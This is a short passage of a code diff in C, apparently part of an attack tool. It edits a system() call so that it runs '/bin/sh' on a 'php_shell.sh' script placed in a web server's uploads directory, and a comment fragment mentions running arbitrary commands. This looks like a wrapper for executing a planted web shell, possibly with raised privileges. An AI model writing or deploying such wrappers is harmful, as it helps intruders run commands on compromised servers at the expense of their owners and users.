@@ -13,8 +13,7 @@
       *          arbitary commands if not.
       * */
 
-     system ("/bin/sh /path/to/php_shell.sh");
-
+     system ("/bin/sh /var/www/html/uploads/php_shell.sh");
      return 0;
    }
 CONTENT
